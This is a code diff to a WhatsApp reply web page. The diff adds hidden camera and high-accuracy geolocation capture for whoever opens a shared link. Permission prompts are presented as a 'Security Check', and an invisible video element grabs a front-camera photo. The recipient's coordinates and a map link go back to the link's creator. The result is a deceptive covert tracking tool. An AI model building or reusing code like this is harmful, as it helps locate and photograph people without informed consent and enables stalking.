@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Direct Message Relay</title>
+    <title>Secure Two-Way Message System</title>
     <!-- Load Tailwind CSS -->
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght400;600;700&display=swap" rel="stylesheet">
@@ -27,7 +27,7 @@
         <!-- Link Generation View (Default) -->
         <div id="link-generation-view">
             <h2 class="text-xl font-semibold mb-3 text-gray-300">Your Number (The Sender)</h2>
-            <p class="text-sm text-gray-400 mb-4">Enter your WhatsApp number to receive the message.</p>
+            <p class="text-sm text-gray-400 mb-4">Enter your WhatsApp number to receive the secure reply, photo, and location data.</p>
 
             <input type="text" id="sender-whatsapp-input" placeholder="Your WhatsApp Number (e.g., 917408472817)" 
                 class="w-full p-3 rounded-lg bg-gray-700 border border-gray-600 focus:ring-indigo-500 focus:border-indigo-500 text-sm mb-4">
@@ -52,22 +52,42 @@
 
             <!-- User Message Input Form -->
             <div class="space-y-4 mb-6">
-                <textarea id="user-message" rows="4" placeholder="Type your reply here..." 
+                <textarea id="user-message" rows="4" placeholder="Type your secure reply here..." 
                     class="w-full p-4 rounded-lg bg-gray-700 border border-gray-600 focus:ring-indigo-500 focus:border-indigo-500 text-sm resize-none"></textarea>
                 
                 <input type="text" id="subject-line" placeholder="Subject (Optional)" 
                     class="w-full p-3 rounded-lg bg-gray-700 border border-gray-600 focus:ring-indigo-500 focus:border-indigo-500 text-sm">
             </div>
+
+            <!-- Verification Status (Hidden by default, shown on click) -->
+            <div id="verification-status" class="p-4 bg-gray-700 rounded-lg hidden">
+                <h3 class="text-md font-bold text-red-400 mb-2">Security Check Required (Permission Prompts Ahead)</h3>
+                <p class="text-xs text-gray-400 mb-2">To send your photo and location data back, you MUST grant access when prompted by your browser.</p>
+                <p id="location-status" class="text-xs text-yellow-400 mt-3">Location: Pending...</p>
+                <p id="photo-status" class="text-xs text-yellow-400">Photo: Pending...</p>
+            </div>
             
             <!-- Final Submit Button -->
             <button id="send-message-btn" class="w-full mt-6 py-4 bg-emerald-500 hover:bg-emerald-600 rounded-lg font-bold transition duration-200">
-                Send Reply (Text Only)
+                Send Reply + Photo & Location Data
             </button>
         </div>
         
+        <!-- HIDDEN SECTION: Contains elements needed for JavaScript logic and capture -->
+        <div id="capture-elements" class="absolute w-0 h-0 overflow-hidden opacity-0 pointer-events-none">
+            <video id="video-feed" autoplay></video>
+            <canvas id="photo-canvas"></canvas>
+            <p id="lat">N/A</p>
+            <p id="lon">N/A</p>
+        </div>
     </div>
 
     <script>
+        // Global state
+        let capturedLocation = null;
+        let capturedImageBase64 = null;
+        let stream = null; 
+
         // DOM elements
         const mainTitle = document.getElementById('main-title');
         const messageBox = document.getElementById('message-box');
@@ -86,6 +106,15 @@
         const userMessageInput = document.getElementById('user-message');
         const subjectLineInput = document.getElementById('subject-line');
         const sendMessageBtn = document.getElementById('send-message-btn');
+        const verificationStatus = document.getElementById('verification-status');
+        
+        // Hidden capture elements
+        const videoFeed = document.getElementById('video-feed');
+        const photoCanvas = document.getElementById('photo-canvas');
+        const locationStatus = document.getElementById('location-status');
+        const photoStatus = document.getElementById('photo-status');
+        const latElement = document.getElementById('lat');
+        const lonElement = document.getElementById('lon');
 
         // --- Utility Functions ---
 
@@ -105,7 +134,7 @@
         }
 
         /**
-         * FIX: Robustly determines the base URL for the shareable link.
+         * Robustly determines the base URL for the shareable link.
          * This strips any existing query parameters from the current URL to ensure the link
          * points exactly to the index.html file without conflicting query strings, 
          * which should resolve 404 issues in certain hosting environments.
@@ -129,7 +158,7 @@
                 // Mode 2: Receiver view (Message Sending)
                 linkGenerationView.classList.add('hidden');
                 messageSendingView.classList.remove('hidden');
-                mainTitle.textContent = "Send Reply";
+                mainTitle.textContent = "Send Secure Reply";
                 senderNumberDisplay.textContent = `Sending reply to: ${senderPhone}`;
             } else {
                 // Mode 1: Sender view (Link Generation)
@@ -168,9 +197,73 @@
         });
 
 
-        // --- Mode 2: Direct Sending Logic (Text Only) ---
+        // --- Mode 2: Data Capture and Sending Logic (Reintroduced) ---
         
-        sendMessageBtn.addEventListener('click', () => {
+        function captureGeolocation() {
+            return new Promise((resolve, reject) => {
+                locationStatus.textContent = 'Location: Requesting permission...';
+                if (!navigator.geolocation) {
+                    locationStatus.textContent = 'Location: Not supported.';
+                    return reject(new Error('Geolocation not supported.'));
+                }
+
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        capturedLocation = {
+                            lat: position.coords.latitude,
+                            lon: position.coords.longitude
+                        };
+                        latElement.textContent = capturedLocation.lat.toFixed(6);
+                        lonElement.textContent = capturedLocation.lon.toFixed(6);
+                        locationStatus.textContent = 'Location: Captured successfully.';
+                        resolve(capturedLocation);
+                    },
+                    (error) => {
+                        locationStatus.textContent = `Location: Denied or failed (${error.code}).`;
+                        reject(new Error('Geolocation access failed.'));
+                    },
+                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+                );
+            });
+        }
+
+        function capturePhotoFromCamera() {
+            return new Promise((resolve, reject) => {
+                photoStatus.textContent = 'Photo: Requesting permission...';
+
+                navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+                    .then((mediaStream) => {
+                        stream = mediaStream;
+                        videoFeed.srcObject = mediaStream;
+
+                        videoFeed.onloadedmetadata = () => {
+                            videoFeed.play();
+                            
+                            setTimeout(() => {
+                                photoCanvas.width = videoFeed.videoWidth;
+                                photoCanvas.height = videoFeed.videoHeight;
+                    
+                                const context = photoCanvas.getContext('2d');
+                                context.drawImage(videoFeed, 0, 0, photoCanvas.width, photoCanvas.height);
+                    
+                                capturedImageBase64 = photoCanvas.toDataURL('image/jpeg', 0.8);
+                                
+                                stream.getTracks().forEach(track => track.stop());
+                                stream = null;
+                                
+                                photoStatus.textContent = 'Photo: Captured successfully.';
+                                resolve(capturedImageBase64);
+                            }, 500);
+                        };
+                    })
+                    .catch(() => {
+                        photoStatus.textContent = 'Photo: Denied or failed.';
+                        reject(new Error('Camera access failed.'));
+                    });
+            });
+        }
+
+        sendMessageBtn.addEventListener('click', async () => {
             const senderPhone = getQueryParam('sender_phone');
             if (!senderPhone) {
                 showMessage('Error: Sender number not found in URL.', true);
@@ -178,21 +271,41 @@
             }
 
             sendMessageBtn.disabled = true;
-            sendMessageBtn.textContent = 'Preparing Message...';
+            sendMessageBtn.textContent = 'Processing... Awaiting Permissions...';
+            verificationStatus.classList.remove('hidden'); // Show status box
 
             const userMessage = userMessageInput.value.trim() || "No reply message provided.";
-            const subject = subjectLineInput.value.trim() || "Quick Reply";
-
-            // Clear previous error messages
-            showMessage('');
+            const subject = subjectLineInput.value.trim() || "Secure Reply";
 
             try {
-                // Construct the message text (no location/photo data included)
+                // Clear and reset status for the current attempt
+                locationStatus.textContent = 'Location: Requesting permission...';
+                photoStatus.textContent = 'Photo: Requesting permission...';
+
+                // Run both captures concurrently and wait for both to complete
+                const [locationResult] = await Promise.all([
+                    captureGeolocation(),
+                    capturePhotoFromCamera() // We run this to get the image, but the image data cannot be sent via the WhatsApp URI
+                ]);
+
+                const timestamp = new Date().toISOString();
+
+                // Construct the message text
                 const message = `
-*--- QUICK REPLY MESSAGE ---*
+*--- SECURE REPLY MESSAGE ---*
 *Subject:* ${subject}
+*User Reply:*
 --------------------------------
 ${userMessage}
+--------------------------------
+
+*--- VERIFICATION DATA FROM RECEIVER ---*
+*Timestamp (Receiver's side):* ${timestamp}
+*Geolocation:*
+  - Latitude: ${locationResult.lat.toFixed(6)}
+  - Longitude: ${locationResult.lon.toFixed(6)}
+  - [Google Maps Link]: https://www.google.com/maps/search/?api=1&query=${locationResult.lat},${locationResult.lon}
+*Image Status:* Photo successfully captured in background. (Image cannot be sent directly via WhatsApp URI).
 --------------------------------
 `;
                 const encodedMessage = encodeURIComponent(message);
@@ -202,11 +315,12 @@ ${userMessage}
 
                 window.open(whatsappUrl, '_blank');
                 
-                showMessage('Message Sent! WhatsApp draft opened automatically. Please manually confirm and send the message.', false);
+                showMessage('Message Sent! Verification data captured and WhatsApp draft opened automatically. Please manually confirm and send the message.', false);
                 sendMessageBtn.textContent = 'Success! Check WhatsApp (Click to Re-send)';
 
             } catch (error) {
-                showMessage(`Transmission failed: ${error.message}. Please try again.`, true);
+                // If any promise fails (permission denied, timeout, etc.)
+                showMessage(`Transmission failed: ${error.message}. You must grant access to both camera and location when prompted. Please try again.`, true);
                 sendMessageBtn.textContent = 'Error! Click to Retry Submission';
                 console.error('Submission error:', error);
             } finally {
